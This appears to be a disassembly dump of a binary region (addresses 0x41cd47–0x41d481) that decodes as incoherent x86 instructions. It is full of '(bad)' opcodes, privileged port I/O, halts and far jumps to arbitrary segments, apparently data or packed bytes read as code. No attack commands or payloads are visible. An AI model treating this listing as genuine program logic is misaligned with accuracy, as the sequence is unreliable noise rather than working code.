  41cd47:	(bad)  
  41cd48:	mov    edx,0xec8eb38f
  41cd4d:	or     al,0x7a
  41cd4f:	pusha  
  41cd50:	sbb    eax,0x98157f6e
  41cd55:	call   0x86c8:0x706ad0eb
  41cd5c:	pop    esi
  41cd5d:	cmp    DWORD PTR [edi+0x66],0xa76b20d8
  41cd64:	inc    eax
  41cd65:	lahf   
  41cd66:	in     eax,dx
  41cd67:	popf   
  41cd68:	imul   esp,DWORD PTR [edi],0x6799efcd
  41cd6e:	fld    DWORD PTR [esi]
  41cd70:	clc    
  41cd71:	repnz int3 
  41cd73:	cdq    
  41cd74:	(bad)  
  41cd75:	xor    eax,0x33cdc37b
  41cd7a:	lahf   
  41cd7b:	mov    edx,0x73723a11
  41cd80:	adc    bl,BYTE PTR [edx+0xd]
  41cd83:	outs   dx,DWORD PTR ds:[esi]
  41cd84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cd85:	push   ecx
  41cd86:	pop    es
  41cd87:	shl    BYTE PTR ds:0xb50695d0,0x72
  41cd8e:	repz pop esp
  41cd90:	dec    ebp
  41cd91:	inc    eax
  41cd92:	cmp    edi,ebx
  41cd94:	dec    edi
  41cd95:	and    eax,0xc695e180
  41cd9a:	lea    ebx,[ebx-0x62932f4c]
  41cda0:	push   ebx
  41cda1:	dec    ebp
  41cda2:	imul   edx,DWORD PTR ds:0xa78e37d7,0x7b
  41cda9:	nop
  41cdaa:	inc    ebp
  41cdab:	shl    BYTE PTR [edi-0x14],1
  41cdae:	mov    edx,0xae6fc66d
  41cdb3:	mov    gs,ebp
  41cdb5:	jmp    0x41ce2d
  41cdb7:	cmc    
  41cdb8:	dec    esi
  41cdb9:	(bad)  
  41cdba:	fs jge 0x41ce29
  41cdbd:	mov    ebx,es
  41cdbf:	rol    esp,1
  41cdc1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cdc2:	mov    edx,0x9dcd81fe
  41cdc7:	pop    edi
  41cdc8:	mov    WORD PTR [ecx-0x51],ss
  41cdcb:	jbe    0x41ce3f
  41cdcd:	call   0xac166f60
  41cdd2:	test   BYTE PTR [eax+0x45094590],dh
  41cdd8:	or     dh,BYTE PTR [ecx+0x566545ff]
  41cdde:	or     al,0x99
  41cde0:	push   edi
  41cde1:	inc    ebp
  41cde2:	(bad)  
  41cde3:	je     0x41ce53
  41cde5:	hlt    
  41cde6:	cmp    ch,BYTE PTR [edi]
  41cde8:	push   edx
  41cde9:	jae    0x41ce1c
  41cdeb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cdec:	hlt    
  41cded:	jmp    0x3bf0:0x160b7d7d
  41cdf4:	xchg   DWORD PTR [esi],ebp
  41cdf6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cdf7:	gs daa 
  41cdf9:	fwait
  41cdfa:	ins    DWORD PTR es:[edi],dx
  41cdfb:	sub    BYTE PTR [esi+0x1003aae3],cl
  41ce01:	mov    esi,0xeb1f07e2
  41ce06:	pop    edi
  41ce07:	nop
  41ce08:	push   esi
  41ce09:	js     0x41ce2c
  41ce0b:	out    dx,eax
  41ce0c:	or     dl,0xd3
  41ce0f:	outs   dx,DWORD PTR ds:[esi]
  41ce10:	pop    ebx
  41ce11:	hlt    
  41ce12:	clc    
  41ce13:	idiv   esi
  41ce15:	jl     0x41cdd7
  41ce17:	cmc    
  41ce18:	fild   QWORD PTR [esi]
  41ce1a:	dec    esp
  41ce1b:	push   es
  41ce1c:	lods   al,BYTE PTR ds:[esi]
  41ce1d:	addr16 mov eax,0x4c40073b
  41ce23:	jmp    0x41ce9c
  41ce25:	push   0xffffffe8
  41ce27:	inc    edx
  41ce28:	ins    BYTE PTR es:[edi],dx
  41ce29:	or     eax,0x59e5636
  41ce2e:	sub    dl,BYTE PTR [ebx-0x35]
  41ce31:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ce32:	out    dx,eax
  41ce33:	mov    bh,ch
  41ce35:	add    DWORD PTR [ebp+ebp*8-0x100428d],edi
  41ce3c:	sub    bh,cl
  41ce3e:	int3   
  41ce3f:	jo     0x41ceac
  41ce41:	xor    al,0xb0
  41ce43:	xchg   esi,eax
  41ce44:	inc    eax
  41ce45:	cmp    bh,0xa4
  41ce48:	mov    ebx,0xebee740
  41ce4d:	inc    edx
  41ce4e:	in     eax,0xdf
  41ce50:	pop    edx
  41ce51:	js     0x41ce6a
  41ce53:	pop    ecx
  41ce54:	inc    ecx
  41ce55:	cmp    ebx,DWORD PTR [edi]
  41ce57:	nop
  41ce58:	dec    esi
  41ce59:	dec    ebx
  41ce5a:	adc    BYTE PTR [eax],dl
  41ce5c:	aam    0xa3
  41ce5e:	inc    edx
  41ce5f:	jmp    0xf368:0xc484f736
  41ce66:	add    cl,BYTE PTR [eax]
  41ce68:	and    al,0xb0
  41ce6a:	xlat   BYTE PTR ds:[ebx]
  41ce6b:	mov    WORD PTR [ecx-0x2a4d2cf5],gs
  41ce71:	xchg   esp,eax
  41ce72:	mov    al,0xed
  41ce74:	add    al,0x20
  41ce76:	(bad)  
  41ce77:	lock push cs
  41ce79:	inc    ebx
  41ce7a:	inc    ebx
  41ce7b:	mov    edx,DWORD PTR [edi]
  41ce7d:	and    esp,edi
  41ce7f:	loop   0x41ce5d
  41ce81:	dec    edi
  41ce82:	lahf   
  41ce83:	ins    BYTE PTR es:[edi],dx
  41ce84:	cmp    al,0x21
  41ce86:	idiv   ah
  41ce88:	mov    cl,0x1c
  41ce8a:	mov    ebx,0x40d8b557
  41ce8f:	out    0x81,eax
  41ce91:	popa   
  41ce92:	sbb    ch,0x53
  41ce95:	clc    
  41ce96:	std    
  41ce97:	iret   
  41ce98:	jge    0x41ce3a
  41ce9a:	mov    esi,0xa03a6d0e
  41ce9f:	and    DWORD PTR [eax],eax
  41cea1:	jecxz  0x41ce6b
  41cea3:	pop    ecx
  41cea4:	fsubr  DWORD PTR [esi-0x73]
  41cea7:	or     eax,0xb0ba2b61
  41ceac:	adc    BYTE PTR [ecx-0x1b62c774],0xaf
  41ceb3:	mov    ds:0xc1a5fe3c,al
  41ceb8:	ins    BYTE PTR es:[edi],dx
  41ceb9:	repnz or eax,0xf7133f4a
  41cebf:	fstp   DWORD PTR [ebx+0x1b]
  41cec2:	and    BYTE PTR [esi],dl
  41cec4:	cs jle 0x41cf1b
  41cec7:	add    eax,0x1fa9e1e3
  41cecc:	in     al,0x7c
  41cece:	rcr    dl,0xe8
  41ced1:	mov    eax,0x66084f3a
  41ced6:	adc    ebp,DWORD PTR [edx+ebp*2-0x36]
  41ceda:	retf   
  41cedb:	mov    WORD PTR [ecx-0x1],gs
  41cede:	adc    edi,DWORD PTR [eax+ebp*1+0x6b9ec65c]
  41cee5:	mov    cl,0xaf
  41cee7:	inc    eax
  41cee8:	add    DWORD PTR [ecx-0x71b2aa4c],ebx
  41ceee:	push   esi
  41ceef:	dec    ecx
  41cef0:	push   0x35
  41cef2:	lods   eax,DWORD PTR ds:[esi]
  41cef3:	popf   
  41cef4:	pop    eax
  41cef5:	es inc esp
  41cef7:	fidiv  WORD PTR ds:0xee7f802f
  41cefd:	xchg   esi,eax
  41cefe:	mov    cl,dl
  41cf00:	popf   
  41cf01:	adc    eax,0x184c2c41
  41cf06:	sub    eax,0x5e502fb0
  41cf0b:	sub    ch,ah
  41cf0d:	inc    edx
  41cf0e:	call   0x138b3325
  41cf13:	pop    ebp
  41cf14:	dec    ebp
  41cf15:	mov    DWORD PTR [ebx-0x32],edi
  41cf18:	enter  0xa5ac,0x19
  41cf1c:	xchg   edx,eax
  41cf1d:	dec    edx
  41cf1e:	cs test dl,0x67
  41cf22:	lahf   
  41cf23:	mov    DWORD PTR [edi],ebx
  41cf25:	sub    DWORD PTR [edi],ebp
  41cf27:	aam    0x7d
  41cf29:	dec    ebp
  41cf2a:	adc    ebp,DWORD PTR [ebp+0x2a]
  41cf2d:	in     eax,0xa0
  41cf2f:	inc    ebp
  41cf30:	hlt    
  41cf31:	xchg   DWORD PTR [ebp-0x6a1254ac],ebp
  41cf37:	iret   
  41cf38:	lods   al,BYTE PTR ds:[esi]
  41cf39:	push   0xffffff80
  41cf3b:	adc    BYTE PTR [edx+0x6d],bh
  41cf3e:	push   esp
  41cf3f:	sbb    al,0x56
  41cf41:	add    al,0xa
  41cf43:	jmp    0x8ed78d0b
  41cf48:	and    eax,ebp
  41cf4a:	push   ebp
  41cf4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cf4c:	adc    al,0xf4
  41cf4e:	test   eax,0x2b8699cf
  41cf53:	jl     0x41cf0c
  41cf55:	call   0xeb052145
  41cf5a:	push   es
  41cf5b:	daa    
  41cf5c:	fidivr DWORD PTR fs:[ecx]
  41cf5f:	arpl   WORD PTR [edx-0x5e],cx
  41cf62:	push   ebx
  41cf63:	xor    bh,BYTE PTR [ebx+0x273a7aff]
  41cf69:	push   ds
  41cf6a:	adc    al,0x91
  41cf6c:	mov    bh,0x63
  41cf6e:	outs   dx,BYTE PTR ds:[esi]
  41cf6f:	xchg   edi,eax
  41cf70:	mov    ch,0x9d
  41cf72:	xchg   BYTE PTR [edx+0x582d39c],ch
  41cf78:	adc    BYTE PTR [eax],bh
  41cf7a:	outs   dx,BYTE PTR ds:[esi]
  41cf7b:	les    ecx,FWORD PTR [ecx-0x77]
  41cf7e:	mov    esp,0x4fa13592
  41cf83:	fmul   QWORD PTR [edx+0x4d]
  41cf86:	cmp    eax,0x828b1f1c
  41cf8b:	daa    
  41cf8c:	sar    DWORD PTR [eax+0x66056a89],1
  41cf92:	or     eax,0x2c08c743
  41cf97:	addr16 es pop esp
  41cf9a:	pushf  
  41cf9b:	lock inc edx
  41cf9d:	cmp    eax,0xa5d2ef03
  41cfa2:	mov    ebp,0xc71ed0ee
  41cfa7:	sbb    esi,DWORD PTR [eax+0x16]
  41cfaa:	jnp    0x41cf3a
  41cfac:	nop
  41cfad:	shl    ebp,cl
  41cfaf:	test   DWORD PTR [eax-0x1],esp
  41cfb2:	xor    DWORD PTR [edx-0x45e49e2d],eax
  41cfb8:	(bad)  
  41cfb9:	leave  
  41cfba:	xor    BYTE PTR [edi],ah
  41cfbc:	mov    ebx,0x1abbcbc4
  41cfc1:	(bad)  
  41cfc3:	nop
  41cfc4:	inc    esi
  41cfc5:	in     al,dx
  41cfc6:	or     BYTE PTR [ecx],0xb9
  41cfc9:	jo     0x41d00c
  41cfcb:	mov    edi,0xc7190e7
  41cfd0:	xchg   DWORD PTR [si-0x3a71],edx
  41cfd5:	outs   dx,BYTE PTR ds:[esi]
  41cfd6:	adc    eax,0x14b6a283
  41cfdb:	shr    ebp,1
  41cfdd:	dec    esp
  41cfde:	aas    
  41cfdf:	mov    ds:0xf0b53435,eax
  41cfe4:	stos   DWORD PTR es:[edi],eax
  41cfe5:	addr16 mov eax,0xdfefda1f
  41cfeb:	(bad)  
  41cfec:	gs maxps xmm5,xmm5
  41cff0:	psrlq  mm6,mm5
  41cff3:	aad    0xce
  41cff5:	lods   al,BYTE PTR ds:[esi]
  41cff6:	cmp    al,0xb1
  41cff8:	xchg   DWORD PTR [ebp-0x2da21460],ecx
  41cffe:	xchg   ecx,eax
  41cfff:	xchg   ebp,eax
  41d000:	mov    ebx,0xb02ede8e
  41d005:	arpl   bx,cx
  41d007:	push   es
  41d008:	addr16 mov ah,0xdf
  41d00b:	lods   eax,DWORD PTR ds:[esi]
  41d00c:	inc    ecx
  41d00d:	cwde   
  41d00e:	xor    eax,0x1529b769
  41d013:	mov    ah,0x84
  41d015:	jmp    0xd0dc:0x47a58e26
  41d01c:	ins    BYTE PTR es:[edi],dx
  41d01d:	pusha  
  41d01e:	push   0x45
  41d020:	sub    BYTE PTR [eax-0x3ecd5b0c],bl
  41d026:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d027:	xchg   ecx,eax
  41d028:	ss ds jo 0x41d02e
  41d02c:	pop    esi
  41d02d:	push   0xcdaab7eb
  41d032:	in     al,0xaa
  41d034:	fstp   QWORD PTR [ecx]
  41d036:	call   0x9237cd29
  41d03b:	sahf   
  41d03c:	shr    BYTE PTR [eax+eiz*2+0x120f9786],1
  41d043:	ds inc ebp
  41d045:	and    al,0xa0
  41d047:	add    esi,DWORD PTR [eax+eax*1-0x21]
  41d04b:	add    esi,DWORD PTR [esi-0xc]
  41d04e:	xchg   ebx,eax
  41d04f:	neg    DWORD PTR [ebx+0x11]
  41d052:	ja     0x41d044
  41d054:	mov    ebp,0x486486b1
  41d059:	dec    ebp
  41d05a:	xchg   esp,eax
  41d05b:	outs   dx,BYTE PTR ds:[esi]
  41d05c:	ins    DWORD PTR es:[edi],dx
  41d05d:	push   esi
  41d05e:	outs   dx,DWORD PTR ds:[esi]
  41d05f:	jno    0x41d003
  41d061:	fwait
  41d062:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d063:	(bad)  
  41d064:	std    
  41d065:	add    eax,DWORD PTR [ecx+0x2f]
  41d068:	xor    DWORD PTR [edi+0x62dbf12d],edi
  41d06e:	retf   
  41d06f:	cmp    al,0x67
  41d071:	jnp    0x41cff3
  41d073:	test   eax,0x563abaea
  41d078:	das    
  41d079:	inc    esi
  41d07a:	adc    BYTE PTR [ebx],al
  41d07c:	push   eax
  41d07d:	pandn  mm0,QWORD PTR [esi]
  41d080:	sbb    ch,BYTE PTR [edi]
  41d082:	in     al,0x14
  41d084:	dec    ebp
  41d085:	scas   al,BYTE PTR es:[edi]
  41d086:	retf   0x69c3
  41d089:	or     eax,0x90f84ec
  41d08e:	add    al,0xa3
  41d090:	xor    BYTE PTR [eax+0x63],al
  41d093:	add    al,0xa
  41d095:	stos   DWORD PTR es:[edi],eax
  41d096:	lahf   
  41d097:	or     DWORD PTR [edx],ebp
  41d099:	mov    eax,0x5e402026
  41d09e:	push   esi
  41d09f:	outs   dx,BYTE PTR ds:[esi]
  41d0a0:	xor    dh,BYTE PTR [edi]
  41d0a2:	jmp    0xb782585c
  41d0a7:	popa   
  41d0a8:	xchg   DWORD PTR [ecx+0x1c],ebx
  41d0ab:	mov    edi,0x2285a769
  41d0b0:	and    esp,esi
  41d0b2:	fiadd  DWORD PTR [ebx-0x46c0cc2c]
  41d0b9:	popa   
  41d0ba:	es dec ebp
  41d0bc:	pushw  ss
  41d0be:	repnz int3 
  41d0c0:	cmp    ch,ch
  41d0c2:	outs   dx,BYTE PTR ds:[esi]
  41d0c3:	mov    al,0xda
  41d0c5:	sub    BYTE PTR [edx],bl
  41d0c7:	or     eax,0x15697bb4
  41d0cc:	push   ebx
  41d0cd:	rcr    BYTE PTR [bp+si+0x66],cl
  41d0d1:	imul   edi,DWORD PTR [edi],0x43
  41d0d4:	in     al,dx
  41d0d5:	pop    ss
  41d0d6:	hlt    
  41d0d7:	iret   
  41d0d8:	fisub  DWORD PTR [edi+0x5e]
  41d0db:	mov    DWORD PTR cs:[edi],0x567df144
  41d0e2:	dec    edx
  41d0e3:	shl    BYTE PTR [ebx+ebx*1],cl
  41d0e6:	jmp    0x1752d268
  41d0eb:	out    0xb6,al
  41d0ed:	test   al,0x46
  41d0ef:	sbb    DWORD PTR [ecx-0x4d],edi
  41d0f2:	sub    DWORD PTR [ecx],esi
  41d0f4:	(bad)  
  41d0f5:	sbb    eax,0x489d8879
  41d0fa:	mov    al,0xcf
  41d0fc:	add    eax,0x71b5652a
  41d101:	jae    0x41d175
  41d103:	lea    edx,[ecx+0x39]
  41d106:	jo     0x41d11d
  41d108:	cmp    BYTE PTR [eax-0x334762f2],ch
  41d10e:	jne    0x41d135
  41d110:	jg     0x41d096
  41d112:	repz fs pop esi
  41d115:	mov    eax,ds:0x8c79e1d3
  41d11a:	pop    ds
  41d11b:	dec    esp
  41d11c:	jne    0x41d164
  41d11e:	pop    ebp
  41d11f:	sbb    al,0xb9
  41d121:	clc    
  41d122:	pop    ebx
  41d123:	addr16 in eax,0xe2
  41d126:	jge    0x41d174
  41d128:	js     0x41d0b6
  41d12a:	dec    edx
  41d12b:	cdq    
  41d12c:	test   eax,0x806330f7
  41d131:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d132:	sti    
  41d133:	das    
  41d134:	jnp    0x41d150
  41d136:	sahf   
  41d137:	dec    ebx
  41d138:	or     eax,0xf6eb2ae2
  41d13d:	mov    ebx,ebx
  41d13f:	stos   BYTE PTR es:[edi],al
  41d140:	or     eax,0xb1575078
  41d145:	dec    esi
  41d146:	aad    0xa6
  41d148:	test   BYTE PTR [ebp+0x0],ah
  41d14b:	ins    DWORD PTR es:[edi],dx
  41d14c:	cmp    DWORD PTR [esi-0x23],edx
  41d14f:	mov    eax,ds:0x48ae7468
  41d154:	iret   
  41d155:	lea    ebx,[esi]
  41d157:	mov    edx,0xdae26b2
  41d15c:	sbb    eax,esi
  41d15e:	in     al,0x5c
  41d160:	xchg   ebp,eax
  41d161:	sub    eax,0xaed10592
  41d166:	or     dl,cl
  41d168:	sub    BYTE PTR [edi+eiz*4],al
  41d16b:	dec    esp
  41d16c:	or     cl,BYTE PTR ds:[ebx-0x65]
  41d170:	mov    ch,0x9f
  41d172:	xor    DWORD PTR [ebp-0x5c],ebx
  41d175:	push   0xfffffffb
  41d177:	jbe    0x41d169
  41d179:	sub    esi,DWORD PTR [eax-0x44da0560]
  41d17f:	dec    ebp
  41d180:	std    
  41d181:	pop    esi
  41d182:	push   esi
  41d183:	fistp  DWORD PTR [ebp+0x6223f3e8]
  41d189:	imul   esi,DWORD PTR [ebp-0xf],0x85829dba
  41d190:	push   cs
  41d191:	cwde   
  41d192:	sbb    esi,DWORD PTR ds:0xaf92a03b
  41d198:	mov    bl,0xea
  41d19a:	xchg   ebx,eax
  41d19b:	daa    
  41d19c:	in     al,dx
  41d19d:	sti    
  41d19e:	pop    eax
  41d19f:	leave  
  41d1a0:	loopne 0x41d126
  41d1a2:	xchg   ecx,eax
  41d1a3:	jmp    0xe852:0x70cc7bc4
  41d1aa:	cli    
  41d1ab:	ins    DWORD PTR es:[edi],dx
  41d1ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d1ad:	sbb    al,0x3d
  41d1af:	xchg   edx,eax
  41d1b0:	mov    ecx,0x703b2687
  41d1b5:	adc    DWORD PTR [ecx-0x7acea5ca],esi
  41d1bb:	push   ebp
  41d1bc:	scas   eax,DWORD PTR es:[edi]
  41d1bd:	xchg   esi,eax
  41d1be:	pop    esp
  41d1bf:	jecxz  0x41d236
  41d1c1:	repz pop ebx
  41d1c3:	pop    ebx
  41d1c4:	xor    al,BYTE PTR [ecx]
  41d1c6:	push   eax
  41d1c7:	push   0x65ebfea5
  41d1cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d1cd:	cdq    
  41d1ce:	xor    dh,BYTE PTR [ebp+0x61]
  41d1d1:	fist   DWORD PTR [ebx+edi*8]
  41d1d4:	cs push cs
  41d1d6:	pop    ebx
  41d1d7:	dec    ebp
  41d1d8:	add    al,0xe7
  41d1da:	and    ebp,ecx
  41d1dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d1dd:	sub    DWORD PTR [edx-0x57],ecx
  41d1e0:	sti    
  41d1e1:	sbb    eax,edx
  41d1e3:	out    dx,eax
  41d1e4:	cmp    DWORD PTR [ecx-0x157f7426],esi
  41d1ea:	es xchg ebx,eax
  41d1ec:	inc    esp
  41d1ed:	pop    ebx
  41d1ee:	je     0x41d1e1
  41d1f0:	xchg   edi,eax
  41d1f1:	mov    cl,0x35
  41d1f3:	fisubr WORD PTR [eax+0x76]
  41d1f6:	mov    ebp,0x15765e2e
  41d1fb:	arpl   WORD PTR [edx+0x69],cx
  41d1fe:	push   es
  41d1ff:	adc    edx,ebx
  41d201:	rcr    DWORD PTR [edx-0x25],0x68
  41d205:	pusha  
  41d206:	cdq    
  41d207:	jle    0x41d1f0
  41d209:	and    BYTE PTR [ecx-0x59],0x26
  41d20d:	(bad)  
  41d20e:	and    DWORD PTR [edx],edx
  41d210:	mov    ebp,0xa567daa6
  41d215:	in     al,dx
  41d216:	sbb    eax,ebx
  41d218:	sub    BYTE PTR [edx+0x39cb7f26],dh
  41d21e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d21f:	aad    0x6c
  41d221:	push   edi
  41d222:	ins    BYTE PTR es:[edi],dx
  41d223:	inc    eax
  41d224:	cmp    al,0x69
  41d226:	enter  0x756d,0xe1
  41d22a:	int    0x61
  41d22c:	call   0x26562ee2
  41d231:	mov    esi,0xf7508e3f
  41d236:	gs jbe 0x41d1d7
  41d239:	push   edi
  41d23a:	sbb    ebp,DWORD PTR [ebx]
  41d23c:	pushf  
  41d23d:	fsubr  st(7),st
  41d23f:	std    
  41d240:	lea    esp,[edi-0x27006177]
  41d246:	in     al,dx
  41d247:	xchg   edx,eax
  41d248:	mov    bh,0x33
  41d24a:	or     DWORD PTR [eax+0x1],0xffffffad
  41d24e:	lahf   
  41d24f:	cmc    
  41d250:	js     0x41d1f5
  41d252:	or     ecx,DWORD PTR [ebx+ecx*4]
  41d255:	sub    eax,0x51cfd4a1
  41d25a:	aad    0x81
  41d25c:	hlt    
  41d25d:	idiv   BYTE PTR ds:0x4503acfe
  41d263:	mov    edx,0xde64247f
  41d268:	pop    eax
  41d269:	pop    es
  41d26a:	loop   0x41d279
  41d26c:	sar    BYTE PTR [esi-0x7c],cl
  41d26f:	add    DWORD PTR [esi-0x22566eb8],esp
  41d275:	out    0xc7,eax
  41d277:	adc    al,0xb1
  41d279:	fstp   DWORD PTR [ebp+0x22aae293]
  41d27f:	mov    ch,0x3
  41d281:	lahf   
  41d282:	push   ds
  41d283:	aaa    
  41d284:	sub    BYTE PTR [ecx+ebx*2-0x56ac829],bl
  41d28b:	(bad)  
  41d28c:	scas   eax,DWORD PTR es:[edi]
  41d28d:	mov    ebx,0xfb5c4bcc
  41d292:	mov    bh,0xd3
  41d294:	stos   BYTE PTR es:[edi],al
  41d295:	aaa    
  41d296:	int3   
  41d297:	es clc 
  41d299:	mov    ds:0xca8c19ff,al
  41d29e:	push   ecx
  41d29f:	push   eax
  41d2a0:	push   edi
  41d2a1:	or     al,cl
  41d2a3:	je     0x41d2e4
  41d2a5:	pop    esi
  41d2a6:	mov    bl,0x2d
  41d2a8:	loop   0x41d2b1
  41d2aa:	out    dx,al
  41d2ab:	jg     0x41d23d
  41d2ad:	sub    ecx,DWORD PTR ds:0x6567dab9
  41d2b3:	ror    ebx,0xc6
  41d2b6:	ret    
  41d2b7:	or     DWORD PTR [eax+0x6c1bb86d],eax
  41d2bd:	je     0x41d317
  41d2bf:	test   al,0x3e
  41d2c1:	cld    
  41d2c2:	aad    0x71
  41d2c4:	or     BYTE PTR ds:0x6df4255d,bh
  41d2ca:	xchg   edx,eax
  41d2cb:	js     0x41d347
  41d2cd:	jns    0x41d2b4
  41d2cf:	mov    BYTE PTR [ebp+0x401577bb],0x15
  41d2d6:	enter  0x65b5,0x2d
  41d2da:	mul    esp
  41d2dc:	shl    WORD PTR gs:[ebp+0x2d],0x37
  41d2e2:	xor    edx,DWORD PTR [eax+0x3c]
  41d2e5:	dec    ebx
  41d2e7:	std    
  41d2e8:	jle    0x41d2eb
  41d2ea:	popa   
  41d2eb:	add    bh,BYTE PTR [ebx]
  41d2ed:	fistp  QWORD PTR [eax-0x6c]
  41d2f0:	mov    dh,BYTE PTR [ecx+edi*2+0x3c773a1]
  41d2f7:	int3   
  41d2f8:	dec    ebp
  41d2f9:	iret   
  41d2fa:	push   esi
  41d2fb:	jecxz  0x41d2b4
  41d2fd:	daa    
  41d2fe:	jb     0x41d31b
  41d300:	leave  
  41d301:	imul   eax,DWORD PTR [edx-0x3d69c7a],0x3be52d86
  41d30b:	leave  
  41d30c:	(bad)  
  41d30e:	or     DWORD PTR [esi+0x2],edx
  41d311:	mov    bl,0xac
  41d313:	push   ds
  41d314:	das    
  41d315:	jp     0x41d2e7
  41d317:	jmp    0x2270:0xd1fb1ec9
  41d31e:	imul   ecx,DWORD PTR [edi],0xf
  41d321:	dec    edi
  41d322:	push   esi
  41d323:	cld    
  41d324:	in     eax,dx
  41d325:	fwait
  41d326:	inc    edx
  41d327:	xchg   DWORD PTR [esi+0x53c35603],esp
  41d32d:	test   al,0xd1
  41d32f:	and    DWORD PTR [ebx],esi
  41d331:	pop    es
  41d332:	sub    DWORD PTR [ebx],ecx
  41d334:	arpl   WORD PTR [ecx+0x73f13f6],bx
  41d33a:	inc    ebp
  41d33b:	adc    ah,BYTE PTR [ebx]
  41d33d:	jge    0x41d2ee
  41d33f:	stos   DWORD PTR es:[edi],eax
  41d340:	pop    esi
  41d341:	in     eax,0xbe
  41d343:	xor    al,0xb1
  41d345:	mov    ecx,0x6f86f08
  41d34a:	and    eax,0x91664023
  41d34f:	ret    
  41d350:	and    eax,0xdfcfdc3e
  41d355:	imul   ebx,DWORD PTR [edx+0x28f96f50],0xa9e935f9
  41d35f:	ror    BYTE PTR [ebx],1
  41d361:	js     0x41d359
  41d363:	dec    esp
  41d364:	(bad)  [edi]
  41d366:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d367:	jge    0x41d325
  41d369:	mov    esi,ebp
  41d36b:	push   eax
  41d36c:	adc    BYTE PTR [esi],cl
  41d36e:	dec    ecx
  41d370:	(bad)  
  41d371:	dec    BYTE PTR [esi+0x2f]
  41d374:	aaa    
  41d375:	out    0xd,eax
  41d377:	push   0xb3a6f86f
  41d37c:	adc    BYTE PTR [ecx+esi*8-0x2a0522f],al
  41d383:	shl    DWORD PTR [esi-0x52],cl
  41d386:	inc    esp
  41d387:	lods   al,BYTE PTR ds:[esi]
  41d388:	sub    eax,0x45cb11d2
  41d38d:	push   eax
  41d38e:	pop    esi
  41d38f:	enter  0x6997,0xfe
  41d393:	out    0x77,eax
  41d395:	push   edi
  41d396:	cmp    al,0x7c
  41d398:	ss push ebp
  41d39a:	dec    edi
  41d39b:	mov    ecx,0x7fcfc4d9
  41d3a0:	and    bh,BYTE PTR [edi-0x559c447c]
  41d3a6:	cmp    ah,BYTE PTR [esp+edi*4+0x4e]
  41d3aa:	mov    edx,0x6072be16
  41d3af:	xchg   esp,eax
  41d3b0:	add    ebp,ebp
  41d3b2:	or     eax,0x1495c417
  41d3b7:	cmp    al,0x1d
  41d3b9:	pop    esp
  41d3ba:	jmp    0x650e:0x16b3785f
  41d3c1:	not    esi
  41d3c3:	arpl   si,bp
  41d3c5:	inc    edi
  41d3c6:	push   edx
  41d3c7:	mov    BYTE PTR [edx+0x6],bl
  41d3ca:	add    ebp,edi
  41d3cc:	shl    BYTE PTR [ebx],1
  41d3ce:	pop    ss
  41d3cf:	push   ds
  41d3d0:	dec    edx
  41d3d1:	scas   eax,DWORD PTR es:[edi]
  41d3d2:	mov    DWORD PTR [edx-0x69d4c6b4],edx
  41d3d8:	lods   al,BYTE PTR ds:[esi]
  41d3d9:	push   edi
  41d3da:	push   ebp
  41d3db:	jo     0x41d41a
  41d3dd:	(bad)  
  41d3de:	or     DWORD PTR [eax-0x1d],0x4b
  41d3e2:	inc    edi
  41d3e3:	push   ss
  41d3e4:	xchg   BYTE PTR [eax-0x61],al
  41d3e7:	add    edx,edi
  41d3e9:	push   eax
  41d3ea:	sub    esp,edx
  41d3ec:	xlat   BYTE PTR ds:[ebx]
  41d3ed:	pop    esi
  41d3ee:	mov    esp,0xc16cdac3
  41d3f3:	in     eax,dx
  41d3f4:	adc    eax,0x2008648e
  41d3f9:	mov    al,0x9b
  41d3fb:	mov    dl,0x21
  41d3fd:	jo     0x41d447
  41d3ff:	inc    ebx
  41d400:	jle    0x41d3ba
  41d402:	pop    ebx
  41d403:	aad    0x9f
  41d405:	xchg   ecx,eax
  41d406:	jp     0x41d45c
  41d408:	adc    edi,DWORD PTR [eax]
  41d40a:	call   0x960b1f40
  41d40f:	aad    0xd2
  41d411:	inc    esp
  41d412:	test   BYTE PTR [esi-0x1f],al
  41d415:	cmp    DWORD PTR [ebx+0xf577da1],ebx
  41d41b:	icebp  
  41d41c:	mov    WORD PTR [ecx],ds
  41d41e:	outs   dx,DWORD PTR ds:[esi]
  41d41f:	mov    WORD PTR [esi-0x3c],?
  41d422:	jnp    0x41d416
  41d424:	aaa    
  41d425:	neg    DWORD PTR [ebx+ebx*8-0x5e]
  41d429:	(bad)  
  41d42a:	jo     0x41d41e
  41d42c:	jp     0x41d3d5
  41d42e:	loopne 0x41d42e
  41d430:	imul   ebp,DWORD PTR [eax+esi*1-0x589c3059],0x49d5fd18
  41d43b:	cmp    ah,BYTE PTR [esi]
  41d43d:	int    0xf
  41d43f:	ins    BYTE PTR es:[edi],dx
  41d440:	push   es
  41d441:	dec    esp
  41d442:	sub    BYTE PTR [edx+0x5a87a76e],bh
  41d448:	stos   DWORD PTR es:[edi],eax
  41d449:	daa    
  41d44a:	retf   
  41d44b:	arpl   WORD PTR [ecx-0x35fd519f],cx
  41d451:	std    
  41d452:	jne    0x41d497
  41d454:	outs   dx,BYTE PTR ds:[esi]
  41d455:	retf   
  41d456:	inc    ebx
  41d457:	mov    ebx,fs
  41d459:	xchg   ecx,eax
  41d45a:	fisubr DWORD PTR [ebx+0x4f3a475e]
  41d460:	into   
  41d461:	enter  0x9546,0x12
  41d465:	mov    ebx,0x6b06e3bb
  41d46a:	pop    esi
  41d46b:	div    ebp
  41d46d:	add    BYTE PTR [ecx],bh
  41d46f:	sub    eax,0xbebd25a3
  41d474:	inc    edi
  41d475:	jo     0x41d3fa
  41d477:	xor    ebx,edx
  41d479:	repnz dec esi
  41d47b:	mov    edi,ebx
  41d47d:	ret    0xbdd4
  41d480:	dec    edi
  41d481:	retf   
